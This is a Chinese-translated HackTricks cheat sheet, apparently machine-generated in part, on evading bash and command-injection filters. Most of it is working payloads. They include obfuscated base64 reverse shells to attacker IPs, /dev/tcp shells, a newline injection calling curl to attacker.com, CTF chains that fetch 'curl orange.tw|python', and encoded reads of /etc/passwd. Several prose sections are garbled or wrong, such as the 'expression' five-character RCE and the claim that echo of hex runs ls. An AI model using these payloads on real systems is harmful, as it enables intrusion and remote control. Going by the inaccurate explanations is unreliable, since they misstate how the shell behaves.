# 绕过Linux限制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
使用[**Trickest**](https://trickest.io/)可以轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 常见限制绕过

### 反向Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 简短的反向Shell

A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the compromised system. It allows the attacker to gain remote access and control over the compromised system.

To create a short reverse shell, you can use the following command:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of your machine and `ATTACKER_PORT` with the port number you want to use for the connection.

This command redirects the input and output of the bash shell to a TCP connection established with the attacker's machine. It enables the attacker to execute commands on the compromised system and receive the output on their machine.

Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 绕过路径和禁用词

When conducting a penetration test or trying to gain unauthorized access to a system, it is common to encounter restrictions on certain paths and forbidden words. These restrictions are put in place to prevent unauthorized access and protect the system from potential vulnerabilities.

However, as a hacker, it is important to know how to bypass these restrictions and find alternative paths to achieve your goals. Here are some useful Linux commands that can help you bypass paths and forbidden words:

1. **mv** command: The `mv` command can be used to rename files and directories. By renaming a restricted file or directory to a non-restricted name, you can bypass the restriction and gain access.

2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and access the file or directory.

3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories without being case-sensitive. This can help you bypass restrictions on forbidden words.

4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-v` option, you can invert the match and search for files that do not contain the forbidden word. This can help you bypass restrictions on forbidden words.

5. **chmod** command: The `chmod` command can be used to change the permissions of files and directories. By changing the permissions of a restricted file or directory, you may be able to gain access to it.

It is important to note that bypassing restrictions and accessing unauthorized files or directories is illegal and unethical. These commands should only be used for educational purposes or with proper authorization. Always ensure that you have the necessary permissions before attempting to bypass any restrictions.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 绕过禁止空格

In some cases, when attempting to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.

#### Technique 1: Enclosing the command in quotes

One simple technique is to enclose the entire command, including the spaces, in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.

For example, instead of running the command `ls -l /etc/passwd`, which contains a space between `ls` and `-l`, you can run `"ls -l /etc/passwd"`.

#### Technique 2: Using escape characters

Another technique is to use escape characters to indicate that the space should be treated as part of the command, rather than a delimiter. The most commonly used escape character is the backslash `\`.

For example, instead of running the command `ls -l /etc/passwd`, you can run `ls\ -l\ /etc/passwd`.

#### Technique 3: Using alternative shells

If the restrictions on spaces are specific to the default shell, you can try using an alternative shell that does not have these restrictions. For example, you can use the `bash` shell instead of the default `sh` shell.

To do this, you can run the command `/bin/bash -c "ls -l /etc/passwd"`. This tells the system to execute the command using the `bash` shell, which does not have the same restrictions on spaces.

By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that bypassing restrictions may be considered unauthorized access and may be illegal. Always ensure that you have proper authorization before attempting to bypass any restrictions.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 绕过反斜杠和斜杠限制

在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些限制可能会妨碍我们执行某些操作，但我们可以使用一些技巧来绕过这些限制。

#### 使用ASCII码

我们可以使用ASCII码来绕过反斜杠和斜杠的限制。每个字符都有一个对应的ASCII码值，我们可以使用这些值来代替字符。

例如，要输入反斜杠字符（\），我们可以使用ASCII码值`\`（92）来代替。同样地，要输入斜杠字符（/），我们可以使用ASCII码值`/`（47）来代替。

以下是使用ASCII码绕过反斜杠和斜杠限制的示例：

```bash
# 输入反斜杠字符（\）
echo -e "\x5c"

# 输入斜杠字符（/）
echo -e "\x2f"
```

#### 使用Unicode编码

类似于ASCII码，我们还可以使用Unicode编码来绕过反斜杠和斜杠的限制。Unicode编码是一种用于表示字符的标准编码系统。

要输入反斜杠字符（\），我们可以使用Unicode编码`\u005c`来代替。同样地，要输入斜杠字符（/），我们可以使用Unicode编码`\u002f`来代替。

以下是使用Unicode编码绕过反斜杠和斜杠限制的示例：

```bash
# 输入反斜杠字符（\）
echo -e "\u005c"

# 输入斜杠字符（/）
echo -e "\u002f"
```

通过使用ASCII码或Unicode编码，我们可以绕过反斜杠和斜杠的限制，以执行我们需要的操作。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过管道限制

在某些情况下，您可能会遇到受限制的Bash环境，其中禁用了某些命令或功能。然而，您可以使用管道操作符（`|`）来绕过这些限制，并执行被禁用的命令。

以下是一些绕过管道限制的方法：

1. 使用`less`命令：如果`more`命令被禁用，您可以使用`less`命令来查看文件内容。例如，`cat file.txt | less`。

2. 使用`grep`命令：如果`sed`或`awk`命令被禁用，您可以使用`grep`命令来进行文本处理。例如，`cat file.txt | grep "pattern"`。

3. 使用`tee`命令：如果您需要将输出重定向到文件，但`>`或`>>`被禁用，您可以使用`tee`命令来实现。例如，`command | tee file.txt`。

请注意，这些方法只是绕过Bash环境的限制，但并不意味着您可以执行任何命令。在进行任何绕过操作之前，请确保您了解并遵守适用的法律和规定。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 通过十六进制编码绕过限制

Sometimes, when trying to execute certain commands or access restricted files, you may encounter restrictions imposed by the system. One way to bypass these restrictions is by using hex encoding.

有时候，在尝试执行特定命令或访问受限文件时，你可能会遇到系统强加的限制。绕过这些限制的一种方法是使用十六进制编码。

Hex encoding involves converting the characters of a command or file path into their hexadecimal representation. This can be done using the `xxd` command in Linux.

十六进制编码涉及将命令或文件路径的字符转换为十六进制表示。在Linux中，可以使用`xxd`命令来完成这个过程。

To bypass restrictions using hex encoding, follow these steps:

要通过十六进制编码绕过限制，请按照以下步骤进行操作：

1. Identify the command or file path that is restricted.

   确定受限制的命令或文件路径。

2. Convert the characters of the command or file path into their hexadecimal representation using the `xxd` command. For example, to convert the command `ls` into hexadecimal, you would run:

   使用`xxd`命令将命令或文件路径的字符转换为十六进制表示。例如，要将命令`ls`转换为十六进制，可以运行以下命令：

   ```bash
   echo -n "ls" | xxd -p
   ```

   This will output the hexadecimal representation of the command, which in this case is `6c73`.

   这将输出命令的十六进制表示，本例中为`6c73`。

3. Use the hexadecimal representation of the command or file path to bypass the restrictions. For example, instead of running `ls`, you would run:

   使用命令或文件路径的十六进制表示来绕过限制。例如，不要运行`ls`，而是运行：

   ```bash
   echo -e "\x6c\x73"
   ```

   This will execute the command `ls` and bypass the restrictions.

   这将执行命令`ls`并绕过限制。

By using hex encoding, you can bypass certain restrictions imposed by the system and execute commands or access files that would otherwise be restricted.

通过使用十六进制编码，你可以绕过系统强加的某些限制，执行命令或访问本来受限的文件。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### 绕过IP限制

Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can use various techniques to bypass these IP restrictions and gain access to the target system. Here are some useful Linux commands that can help you achieve this:

#### 1. IP Spoofing

IP spoofing involves modifying the source IP address of network packets to make it appear as if they are coming from a different IP address. This can be done using the `hping3` command. Here's an example:

```bash
hping3 -a <spoofed_ip> -c 1 <target_ip>
```

Replace `<spoofed_ip>` with the IP address you want to spoof and `<target_ip>` with the IP address of the target system.

#### 2. Proxychains

Proxychains is a tool that allows you to run any program through a proxy server. This can help you bypass IP restrictions by routing your traffic through a different IP address. Here's how you can use it:

```bash
proxychains <command>
```

Replace `<command>` with the command you want to run through the proxy.

#### 3. VPN

Using a Virtual Private Network (VPN) can also help you bypass IP restrictions. By connecting to a VPN server, your traffic will be routed through the server's IP address, making it appear as if you are accessing the target system from a different location. There are various VPN clients available for Linux, such as OpenVPN and WireGuard.

#### 4. Tor

Tor is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your traffic through multiple Tor nodes, you can bypass IP restrictions and maintain your anonymity. To use Tor, you can install the Tor Browser or configure your system to use the Tor network directly.

These are just a few techniques that can help you bypass IP restrictions during a penetration test. It's important to note that bypassing IP restrictions without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before attempting any such actions.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 基于时间的数据泄露

Time based data exfiltration is a technique used by hackers to extract sensitive information from a target system by utilizing timing delays. This technique is particularly useful when traditional methods of data exfiltration, such as network-based transfers, are blocked or restricted.

基于时间的数据泄露是黑客利用时间延迟从目标系统中提取敏感信息的一种技术。当传统的数据泄露方法，如基于网络的传输，被阻止或受限时，这种技术尤其有用。

The concept behind time based data exfiltration is to encode the sensitive information into a format that can be transmitted through timing delays. This can be achieved by manipulating the timing of certain operations or by introducing deliberate delays in the execution of commands.

基于时间的数据泄露的概念是将敏感信息编码成可以通过时间延迟传输的格式。可以通过操作的时间安排或者故意延迟命令的执行来实现这一点。

For example, a hacker may use the `ping` command to send ICMP echo requests to a remote server. By manipulating the payload of the ICMP packets, the hacker can encode the sensitive information into the timing delays between the requests and responses. The remote server can then be configured to monitor and decode these timing delays, effectively extracting the sensitive information.

例如，黑客可以使用`ping`命令向远程服务器发送ICMP回显请求。通过操纵ICMP数据包的有效载荷，黑客可以将敏感信息编码到请求和响应之间的时间延迟中。然后，可以配置远程服务器来监视和解码这些时间延迟，从而有效地提取敏感信息。

Time based data exfiltration can be a stealthy technique as it does not rely on traditional network-based communication channels. However, it can also be slower and more prone to errors compared to other methods of data exfiltration.

基于时间的数据泄露可以是一种隐蔽的技术，因为它不依赖于传统的基于网络的通信渠道。然而，与其他数据泄露方法相比，它可能更慢且更容易出错。

To defend against time based data exfiltration, it is important to implement proper network monitoring and intrusion detection systems. Additionally, regular security audits and vulnerability assessments can help identify and mitigate potential vulnerabilities that could be exploited for time based data exfiltration.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 从环境变量中获取字符

In some cases, you may encounter restrictions that prevent you from executing certain commands or accessing certain files. However, you can still bypass these restrictions by utilizing the values stored in environment variables.

在某些情况下，您可能会遇到阻止您执行某些命令或访问某些文件的限制。然而，您仍然可以通过利用环境变量中存储的值来绕过这些限制。

To extract characters from environment variables, you can use the `echo` command along with the variable name enclosed in dollar signs (`$`). For example, if you have an environment variable named `SECRET` that contains the value `password123`, you can retrieve the characters by running the following command:

要从环境变量中提取字符，您可以使用`echo`命令以及用美元符号（`$`）括起来的变量名。例如，如果您有一个名为`SECRET`的环境变量，其中包含值`password123`，您可以通过运行以下命令来检索字符：

```bash
echo $SECRET
```

This command will output `password123`, allowing you to access the characters stored in the `SECRET` environment variable.

该命令将输出`password123`，使您能够访问存储在`SECRET`环境变量中的字符。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS数据泄露

你可以使用**burpcollab**或[**pingb**](http://pingb.in)等工具。

### 内置命令

如果你无法执行外部函数，只能访问**有限的内置命令来获取RCE**，那么有一些巧妙的技巧可以帮助你。通常你**无法使用所有的**内置命令，所以你应该**了解所有的选项**来尝试绕过限制。这个想法来自[**devploit**](https://twitter.com/devploit)。\
首先，检查所有的[**shell内置命令**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**。**然后，这里有一些建议：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 多语言命令注入

Polyglot command injection (多语言命令注入) 是一种利用不同语言解释器的漏洞来执行恶意命令的技术。这种攻击方法可以绕过基于 Bash 的限制，因为它利用了其他语言的解释器来执行命令。

在进行多语言命令注入时，攻击者会构造一个恶意输入，该输入既可以被 Bash 解释为有效的命令，又可以被其他语言解释器解释为有效的代码。这样，攻击者就可以通过注入恶意命令来执行任意操作，包括读取、修改或删除敏感数据，甚至获取系统的完全控制权。

为了成功执行多语言命令注入攻击，攻击者需要了解目标系统上可用的不同语言解释器，并构造一个有效的注入字符串。常见的多语言命令注入漏洞利用技术包括使用 PHP、Python、Ruby、Perl 等解释器。

为了防止多语言命令注入攻击，建议采取以下措施：

- 验证和过滤用户输入，确保输入数据符合预期的格式和范围。
- 使用最小特权原则，限制应用程序和服务的权限。
- 更新和修补系统和应用程序，以修复已知的漏洞。
- 配置防火墙和入侵检测系统，以监控和阻止恶意流量。
- 定期审计和监控系统，以及及时响应和处理安全事件。

通过采取这些措施，可以有效减少多语言命令注入攻击的风险，并提高系统的安全性。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 绕过潜在的正则表达式限制

在进行渗透测试时，有时会遇到正则表达式的限制，这可能会阻碍我们的进一步操作。然而，我们可以使用一些技巧来绕过这些限制。

#### 1. 使用字符类

正则表达式中的字符类可以帮助我们绕过某些限制。例如，如果我们想匹配一个数字，但是正则表达式限制了我们只能使用字母，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任何数字。

#### 2. 使用转义字符

转义字符可以帮助我们绕过正则表达式的限制。例如，如果正则表达式限制了我们不能使用特殊字符，我们可以使用转义字符`\`来转义这些字符。例如，`\.`可以匹配一个点。

#### 3. 使用反向引用

反向引用可以帮助我们绕过正则表达式的限制。如果正则表达式限制了我们不能使用某些特定的字符串，但是我们可以使用其他字符串，我们可以使用反向引用来绕过这个限制。例如，如果正则表达式限制了我们不能使用字符串`abc`，但是我们可以使用字符串`def`，我们可以使用反向引用来匹配`def`并替换为`abc`。

#### 4. 使用非贪婪匹配

非贪婪匹配可以帮助我们绕过正则表达式的限制。如果正则表达式限制了我们只能匹配最长的字符串，我们可以使用非贪婪匹配来匹配最短的字符串。例如，`.*?`可以匹配任何字符，但是只匹配最短的字符串。

#### 5. 使用零宽断言

零宽断言可以帮助我们绕过正则表达式的限制。如果正则表达式限制了我们只能匹配特定位置的字符串，我们可以使用零宽断言来匹配其他位置的字符串。例如，`(?<=abc)`可以匹配在字符串`abc`之后的任何字符。

通过使用这些技巧，我们可以绕过正则表达式的限制，从而更好地进行渗透测试。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bash混淆器

Bashfuscator是一种工具，用于混淆Bash脚本的代码，以绕过对Bash脚本的限制。它通过对代码进行各种转换和修改，使其难以被检测和分析。Bashfuscator可以帮助黑客隐藏他们的意图和行为，使其更难以被发现和阻止。使用Bashfuscator可以增加攻击者在渗透测试和黑客攻击中的成功率。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 五个字符实现远程命令执行（RCE）

在某些情况下，我们可能会遇到受限制的环境，其中我们无法使用常规的命令执行技术。然而，我们仍然可以利用一些特殊的字符来绕过这些限制，并实现远程命令执行（RCE）。

以下是一个使用仅五个字符的方法来实现RCE的示例：

```bash
${IFS%?*}e${IFS%?*}x${IFS%?*}p${IFS%?*}r${IFS%?*}e${IFS%?*}s${IFS%?*}s${IFS%?*}i${IFS%?*}o${IFS%?*}n${IFS%?*} $CMD
```

在这个示例中，我们使用了`${IFS%?*}`这个特殊的字符序列。`${IFS}`是一个环境变量，它包含了用于分隔命令行参数的空格字符。`${IFS%?*}`则是`${IFS}`的一个变体，它会删除最后一个字符。

通过在每个字符之间插入`${IFS%?*}`，我们可以绕过命令执行的限制，并将命令拼接在一起。最后，我们将`$CMD`作为参数传递给`expression`命令，从而实现远程命令执行。

请注意，这种技术可能不适用于所有环境，因为某些环境可能会对特殊字符进行过滤或限制。在使用这种技术时，请务必谨慎，并确保已经了解了目标环境的限制和安全策略。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4个字符的远程命令执行（RCE）

在某些情况下，我们可能会遇到一些限制，例如仅能使用4个字符来执行远程命令。这种情况下，我们需要找到一种方法来绕过这些限制。下面是一些可以用于绕过Bash限制的有用Linux命令。

#### 1. 使用反引号

反引号（`）可以用来执行命令并将结果返回给变量。我们可以使用反引号来绕过限制，例如：

```bash
`ls`
```

这将执行`ls`命令并返回结果。

#### 2. 使用$()

$()也可以用来执行命令并将结果返回给变量。我们可以使用$()来绕过限制，例如：

```bash
$(ls)
```

这将执行`ls`命令并返回结果。

#### 3. 使用管道

管道（|）可以将一个命令的输出作为另一个命令的输入。我们可以使用管道来绕过限制，例如：

```bash
ls | cat
```

这将将`ls`命令的输出作为`cat`命令的输入。

#### 4. 使用通配符

通配符（*）可以匹配任意字符。我们可以使用通配符来绕过限制，例如：

```bash
ls *
```

这将列出当前目录中的所有文件和文件夹。

通过使用这些技巧，我们可以在受限制的环境中执行远程命令。请记住，这些技巧可能不适用于所有情况，具体取决于环境和限制的设置。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 只读/Noexec/Distroless绕过

如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot和其他监狱绕过

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考资料和更多

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
使用[**Trickest**](https://trickest.io/)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
